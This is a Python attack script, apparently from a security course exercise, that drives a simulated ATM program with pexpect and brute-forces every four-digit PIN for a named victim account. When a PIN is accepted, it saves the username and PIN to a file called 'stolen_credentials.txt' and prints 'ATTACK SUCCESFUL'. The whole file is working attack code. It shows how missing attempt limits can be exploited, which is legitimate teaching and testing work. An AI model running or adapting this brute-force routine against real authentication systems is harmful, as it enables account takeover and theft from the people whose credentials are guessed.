#! /usr/bin/env python

from __future__ import print_function
import pexpect
import sys
import os
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument('proj_path')
parser.add_argument('victim_name')
parser.add_argument('file_path')
parser.add_argument('-d', '--discard-stderr',
                    dest='discard',
                    action='store_true',
                    default=False,
                    help='discard STDERR, if you are using it for diagnostics'
                    )
parser.add_argument('-l', '--log-stdout',
                    dest='logstdout',
                    action='store_true',
                    default=False,
                    help='log to stdout instead of stderr'
                    )
parser.add_argument('--no-cleanup',
                    dest='nocleanup',
                    action='store_true',
                    default=False,
                    help='disable cleanup'
                    )
parser.add_argument('--no-ext',
                    dest='no_ext',
                    action='store_true',
                    default=False,
                    help='Invoke bank and atm with /path/to/file instead of /path/to/file.bank'
                    )
args = parser.parse_args()

proj_path = args.proj_path
victim_name = args.victim_name
file_path = args.file_path
discard = ''
if args.discard:
    discard = ' 2>/dev/null'

stderr = sys.stderr
stdout = sys.stdout
if 'buffer' in dir(stderr):
    stderr = stderr.buffer
if 'buffer' in dir(stdout):
    stdout = stdout.buffer

def spawn(cmd, **kwargs):
    retval = None
    try:
        retval = pexpect.spawn('/bin/bash', ['-c', cmd + discard], timeout=5, logfile=stderr
        if not args.logstdout else stdout, **kwargs)
        retval.ignorecase = True
        retval.setecho(False)
    except:
        pass
    return retval


def guess_pin(proj_path,victim_name):

    atm = spawn('{path1}/atm {path2}.atm'.format(path1=proj_path,path2=file_path))
   
    # Loop untill we found correct pin
    for i in range(10000):
        pin = ("{:04d}".format(i))
        atm.expect('ATM: ')
        atm.sendline('begin-session '+victim_name)
        atm.expect('PIN?')
        atm.sendline(pin)
        rtval = atm.expect(['Not Authorized','Authorized'],timeout=10)
        if rtval == 1:
            with open("stolen_credentials.txt", "w") as f:
                f.write("Username    -     Pin" )
                f.write("\n")
                f.write(victim_name+"      -   "+pin)
                f.write("\n")
            print("ATTACK SUCCESFUL")
            break

guess_pin(proj_path,victim_name)
